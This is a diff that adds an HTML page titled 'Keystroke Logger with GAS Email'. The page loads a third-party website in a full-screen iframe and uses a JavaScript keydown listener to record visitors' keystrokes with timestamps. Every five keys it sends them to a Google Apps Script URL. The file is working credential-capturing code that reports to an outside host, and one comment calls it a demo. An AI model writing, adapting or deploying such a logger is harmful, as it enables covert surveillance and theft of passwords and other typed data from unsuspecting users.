@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8" />
+<title>Keystroke Logger with GAS Email</title>
+<style>
+  body {
+    margin: 0;
+    font-family: Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    height: 100vh;
+  }
+
+  
+  #iframeContainer {
+    flex: 1;
+    display: flex;
+    height: 100%;
+  }
+  iframe {
+    width: 100%;
+    height: 100%;
+    border: none;
+  }
+</style>
+</head>
+<body>
+
+
+
+
+<div id="iframeContainer">
+  <!-- Embed the PFControl website inside the iframe -->
+  <iframe src="https://1ceit.com/"></iframe>
+</div>
+
+<p></p>
+<div id="status"></div>
+
+<script>
+    
+const scriptUrl = 'https://script.google.com/macros/s/AKfycbyqov1BGhPO27Oe36Ur9ZJ9Us4W3ZRn9it-OnNmdUen1bGZGL7-i0oiv_r8zVwITw54DA/exec'; // Replace with your Google Apps Script URL
+
+let keystrokes = [];
+
+function sendLogs(logs) {
+  fetch(scriptUrl, {
+    method: 'POST',
+    contentType: 'application/json',
+    body: JSON.stringify({ logs: logs })
+  })
+  .then(response => response.json())
+  .then(data => {
+    document.getElementById('status').textContent = 'Logs sent!';
+  })
+  .catch(error => {
+    document.getElementById('status').textContent = 'Error sending logs.';
+  });
+}
+
+document.addEventListener('keydown', function(event) {
+  const data = {
+    key: event.key,
+    code: event.code,
+    timestamp: new Date().getTime()
+  };
+  keystrokes.push(data);
+  if (keystrokes.length >= 5) { // Send after 5 keystrokes for demo
+    sendLogs(keystrokes);
+    keystrokes = [];
+  }
+});
+</script>
+
+</body>
+</html>
